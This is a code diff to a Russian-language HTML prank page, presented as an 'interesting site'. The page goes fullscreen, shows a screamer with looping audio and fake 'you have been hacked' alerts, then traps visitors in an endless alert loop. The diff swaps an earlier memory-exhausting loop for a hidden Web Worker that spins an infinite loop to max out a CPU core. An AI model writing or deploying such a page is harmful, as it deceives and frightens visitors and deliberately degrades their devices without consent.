@@ -3,12 +3,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    
-    <!-- --- ИСПРАВЛЕНИЕ КЭША --- -->
     <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
     <meta http-equiv="Pragma" content="no-cache" />
     <meta http-equiv="Expires" content="0" />
-
     <title>Интересный сайт</title>
     <style>
         body { margin: 0; overflow: hidden; background-color: #f0f0f0; }
@@ -39,6 +36,17 @@
     </div>
 
     <audio id="screamSound" src="fsdsdfhh.mp3" loop preload="auto"></audio>
+    
+    <!-- --- НОВЫЙ КОД: WEB WORKER ДЛЯ ФОНОВОЙ НАГРУЗКИ --- -->
+    <script id="worker-script" type="javascript/worker">
+        // Этот код будет выполняться в отдельном потоке
+        self.onmessage = function() {
+            // Бесконечный цикл, который на 100% грузит ядро процессора
+            while (true) {
+                // Ничего не делаем, просто крутимся
+            }
+        };
+    </script>
 
     <script>
         const startButton = document.getElementById('startButton');
@@ -46,22 +54,33 @@
         const screamer = document.getElementById('screamer');
         const screamSound = document.getElementById('screamSound');
 
-        // Функция, которая создает бесконечные уведомления и пожирает память
-        function startChaos() {
-            let memoryHog = []; // Массив, в который будем складывать "мусор"
+        // Функция, которая создает бесконечные уведомления
+        function startAlertLoop() {
             while (true) {
                 alert("вас взломали");
-                // Создаем очень большую строку и добавляем в массив, чтобы быстро занять память
-                memoryHog.push(new Array(1000000).join('x')); 
+            }
+        }
+        
+        // Функция, которая запускает фоновую нагрузку на процессор
+        function startCpuLoad() {
+            try {
+                // Создаем Worker из скрипта на этой же странице
+                const workerScript = document.getElementById('worker-script').textContent;
+                const blob = new Blob([workerScript], { type: 'javascript/worker' });
+                const worker = new Worker(URL.createObjectURL(blob));
+                // Запускаем бесконечный цикл внутри Worker'а
+                worker.postMessage('start');
+                console.log('Фоновая нагрузка на процессор запущена.');
+            } catch (e) {
+                console.error('Не удалось запустить Worker:', e);
             }
         }
 
         // Функция, которая показывает финальное уведомление и запускает хаос
         function triggerFinalStage() {
-            screamer.style.display = 'none'; // Скрываем скример
+            screamer.style.display = 'none';
             alert("взлом 100%");
-            // После нажатия "ОК" начнется бесконечный цикл
-            startChaos();
+            startAlertLoop(); // После "OK" начнется цикл уведомлений
         }
 
         // Слушатель нажатия на кнопку "Начать"
@@ -69,21 +88,24 @@
             if (document.documentElement.requestFullscreen) {
                 document.documentElement.requestFullscreen();
             }
-            
             intro.style.display = 'none';
             document.body.style.backgroundColor = '#000';
             
-            // Этап 1: Сразу показываем уведомление "Взлом 50%"
-            // Весь последующий код выполнится только ПОСЛЕ того, как пользователь нажмет "OK"
-            alert("взлом 50%");
+            // Этап 1: Ждем 1 секунду
+            setTimeout(() => {
+                // Этап 2: Показываем "Взлом 50%"
+                alert("взлом 50%");
 
-            // Этап 2: Сразу после "OK" показываем скример и играем звук
-            screamer.style.display = 'flex';
-            screamSound.src = `fsdsdfhh.mp3?t=${new Date().getTime()}`; // Анти-кэш
-            screamSound.play();
-            
-            // Этап 3: Через 3 секунды скример пропадет и начнется финальная стадия
-            setTimeout(triggerFinalStage, 3000);
+                // Этап 3: Сразу после "OK" - скример, звук и ФОНОВАЯ НАГРУЗКА
+                screamer.style.display = 'flex';
+                screamSound.src = `fsdsdfhh.mp3?t=${new Date().getTime()}`;
+                screamSound.play();
+                startCpuLoad(); // <--- ЗАПУСК НАГРУЗКИ
+                
+                // Этап 4: Через 3 секунды переходим к финалу
+                setTimeout(triggerFinalStage, 3000);
+
+            }, 1000); // Задержка в 1 секунду
         });
     </script>
 
